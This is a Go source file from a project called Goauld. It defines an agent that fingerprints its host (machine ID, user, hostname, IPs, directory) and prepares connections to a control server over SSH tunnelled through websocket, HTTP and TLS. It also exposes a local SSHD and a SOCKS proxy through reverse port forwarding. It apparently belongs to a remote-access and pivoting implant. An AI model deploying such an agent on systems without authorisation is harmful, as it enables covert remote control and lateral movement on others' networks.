package agent

import (
	"Goauld/common/crypto"
	ssh "Goauld/common/ssh"
	"crypto/md5"
	"errors"
	"fmt"
	"github.com/alecthomas/kong"
	"github.com/denisbrodbeck/machineid"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
)

type Agent struct {
	Id                       string
	SShPrivateKey            string
	SharedSecret             string
	Cryptor                  *crypto.SymCryptor
	cfg                      *Config
	RemoteDynamicPortForward []int
	RemotePortForward        []int
	Platform                 string
	Architecture             string
	Username                 string
	Hostname                 string
	IPs                      []string
	Path                     string
}

var agent *Agent

// InitAgent parses the command lines arguments and initializes the temporary values (shared secret,etc...)
func InitAgent() (*kong.Context, error, []error) {
	warnings := []error{}
	// Parse the command line arguments
	ctx, cfg, err := parse()
	if err != nil {
		return nil, fmt.Errorf("parsing arguments: %v", err), nil
	}
	// Generate the shared secret
	sharedSecret, err := crypto.GeneratePassword(crypto.PasswordLength)
	if err != nil {
		return nil, fmt.Errorf("error generating ssh password: %v", err), nil
	}
	// Generate the local password if not provided
	if cfg.LocalSshPassword == "" {
		sshPassword, err := crypto.GeneratePassword(crypto.PasswordLength)
		if err != nil {
			return nil, fmt.Errorf("error generating ssh password: %v", err), nil
		}
		cfg.LocalSshPassword = sshPassword
	}

	// Generate the encryption mechanism
	cryptor, err := crypto.NewCryptor(sharedSecret)
	if err != nil {
		return nil, fmt.Errorf("initializing cryptor: %v", err), nil
	}

	// compute the agent ID used to identify it
	mid, err := machineid.ID()
	if err != nil {
		return nil, fmt.Errorf("error generating machine id: %v", err), nil
	}
	id := fmt.Sprintf("%x", md5.Sum([]byte(mid)))

	// Generate the agent name if not provided
	if cfg.Name == _name {
		userName, err := user.Current()
		if err != nil {
			return nil, fmt.Errorf("error getting current user: %v", err), nil
		}
		hostname, err := os.Hostname()
		if err != nil {
			return nil, fmt.Errorf("error getting hostname: %v", err), nil
		}
		cfg.Name = fmt.Sprintf("%s@%s", userName.Username, hostname)
	}

	host, err := os.Hostname()
	if err != nil {
		warnings = append(warnings, fmt.Errorf("error getting hostname: %v", err))
	}

	u, err := user.Current()
	if err != nil {
		warnings = append(warnings, fmt.Errorf("error getting user: %v", err))
	}
	ips, errs := getIps()
	if len(errs) > 0 {
		warnings = append(warnings, fmt.Errorf("error getting ips: %v", errors.Join(errs...)))
	}

	currDir, err := os.Getwd()
	if err != nil {
		warnings = append(warnings, fmt.Errorf("error getting current directory: %v", err))
	}
	agent = &Agent{
		Id:                       id,
		SharedSecret:             sharedSecret,
		Cryptor:                  cryptor,
		cfg:                      cfg,
		RemoteDynamicPortForward: nil,
		RemotePortForward:        nil,
		Platform:                 runtime.GOOS,
		Architecture:             runtime.GOARCH,
		Username:                 u.Username,
		Hostname:                 host,
		IPs:                      ips,
		Path:                     currDir,
	}
	return ctx, nil, warnings
}

func Get() *Agent {
	return agent
}

// Verbosity returns the current log verbosity
func (a *Agent) Verbosity() int {
	return a.cfg.Verbose
}

/*
// LocalSShdAddress returns the local address the sshd server listens
func (a *Agent) LocalSShdAddress() string {
	return net.JoinHostPort("127.0.0.1", strconv.Itoa(a.cfg.SshdPort))
}
*/
// LocalSShdPassword returns the current ssh password allowing to connect
func (a *Agent) LocalSShdPassword() string {
	return a.cfg.LocalSshPassword
}

/*
// LocalSshdPort returns the local SSHD password
func (a *Agent) LocalSshdPort() int {
	return a.cfg.SshdPort
}

// SetLocalSshdPort sets the SSHD port to the configuration
func (a *Agent) SetLocalSshdPort(p int) {
	a.cfg.SshdPort = p
}

// IsLocalSshdRandomPort returns whether the local SSHD port is random
func (a *Agent) IsLocalSshdRandomPort() bool {
	return a.cfg.SshdPort == 0
}
*/
// ControlSshServer returns the SSHD server
func (a *Agent) ControlSshServer() string {
	return a.cfg.SshServer
}

// IsRemoteForwardedSshdPortRandom returns whether the remote forwarded SSHD port is random
func (a *Agent) IsRemoteForwardedSshdPortRandom() bool {
	return a.cfg.RsshPort == 0
}

// RsshPort returns the remote forwarded SSHD port
func (a *Agent) RsshPort() int {
	return a.cfg.RsshPort
}

// RemoteForwardedSshdAddress returns the remote forwarded SSHD address
func (a *Agent) RemoteForwardedSshdAddress() string {
	return fmt.Sprintf("127.0.0.1:%d", a.cfg.RsshPort)
}

// RemoteForwardedSocksAddress returns the remote forwarded Socks address
func (a *Agent) RemoteForwardedSocksAddress() string {
	return fmt.Sprintf("127.0.0.1:%d", a.cfg.SocksPort)
}

// RemoteForwardedSocksPort returns the remote forwarded Socks port
func (a *Agent) RemoteForwardedSocksPort() int {
	return a.cfg.SocksPort
}

// RemoteForwardedSocksPort returns the remote forwarded Socks port
func (a *Agent) RemoteForwardedSshdPort() int {
	return a.cfg.RsshPort
}

// UpdateSocksPort set the new socks port
func (a *Agent) UpdateSocksPort(port int) {
	a.cfg.SocksPort = port
}

// UpdateSshdPort set the new socks port
func (a *Agent) UpdateSshdPort(port int) {
	a.cfg.RsshPort = port
}

// ServerUrl return the HTTP control server URL
func (a *Agent) ServerUrl() string {
	url := ""
	if strings.HasPrefix(a.cfg.Server, "http://") {
		url = a.cfg.Server
	} else if strings.HasPrefix(a.cfg.Server, "https://") {
		url = a.cfg.Server
	} else {
		url = "http://" + a.cfg.Server
	}

	return url
}

// WSshUrl return the SSH over Websocket connection URL
func (a *Agent) WSshUrl() string {
	return fmt.Sprintf("%s/wssh/%s", a.ServerUrl(), a.Id)
}

// SocketIoUrl return the control connection URL
func (a *Agent) SocketIoUrl() string {
	return fmt.Sprintf("%s/socket.io/", a.ServerUrl())
}

// SSHTTPUrl return the SSH over HTTP connection URL
func (a *Agent) SSHTTPUrl() string {
	return fmt.Sprintf("%s/sshttp/%s", a.ServerUrl(), a.Id)
}

// TlsUrl return the SSH over TLS connection URL
func (a *Agent) TlsUrl() string {
	return fmt.Sprintf("%s:443", a.cfg.TlsServer)
}

// Name returns the agent name
func (a *Agent) Name() string {
	return a.cfg.Name
}

// GetKeepalive returns the duration between two keepalive ping
func (a *Agent) GetKeepalive() time.Duration {
	return time.Duration(a.cfg.KeepAlive)
}

// GetRsshOrder returns the order thtat the agent should follow to attempt to connect
// to the SSHD server
func (a *Agent) GetRsshOrder() []string {
	return a.cfg.RsshOrder
}

// AgePubKey returns the age public key used to encrypt asymetrically data
func (a *Agent) AgePubKey() string {
	return a.cfg.AgePubKey
}

// SshdEnabled returns whether the sshd server is enabled
func (a *Agent) SshdEnabled() bool {
	return a.cfg.Sshd
}

// SocksEnabled returns whether the socks server is enabled
func (a *Agent) SocksEnabled() bool {
	return a.cfg.Socks || a.cfg.SocksPort != 0
}

// SocksUseSystemProxy returns whether the agent Socks proxy should use the system proxy (if applicable)
func (a *Agent) SocksUseSystemProxy() bool {
	return a.cfg.SocksUseSystemProxy
}

// AddSshdToRpf adds the SSHD conf to the Remote port forwarding list
func (a *Agent) AddSshdToRpf() {
	sshdRpf := ssh.RemotePortForwarding{
		ServerPort: a.cfg.RsshPort,
		AgentPort:  -1,
		AgentIP:    "0.0.0.0",
		Tag:        "sshd",
	}
	a.cfg.RemotePortForwarding = append(a.cfg.RemotePortForwarding, sshdRpf)
}

// AddSocksToRpf adds the SSHD conf to the Remote port forwarding list
func (a *Agent) AddSocksToRpf() {
	sshdRpf := ssh.RemotePortForwarding{
		ServerPort: a.cfg.SocksPort,
		AgentPort:  -1,
		AgentIP:    "0.0.0.0",
		Tag:        "socks",
	}
	a.cfg.RemotePortForwarding = append(a.cfg.RemotePortForwarding, sshdRpf)
}

func (a *Agent) GetRemotePortForwarding() []ssh.RemotePortForwarding {
	return a.cfg.RemotePortForwarding
}

// func getID() string {
// 	id, err != machin
// }

func getIps() ([]string, []error) {
	IPS := make([]string, 0)

	errs := make([]error, 0)
	ifaces, err := net.Interfaces()
	if err != nil {
		errs = append(errs, err)
	}

	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			errs = append(errs, err)
		}
		for _, addr := range addrs {
			if strings.HasPrefix(addr.String(), "fe80:") || strings.HasPrefix(addr.String(), "127.") {
				continue
			}
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback == 0 {
				IPS = append(IPS, addr.String())
			}
		}
	}
	return IPS, errs
}
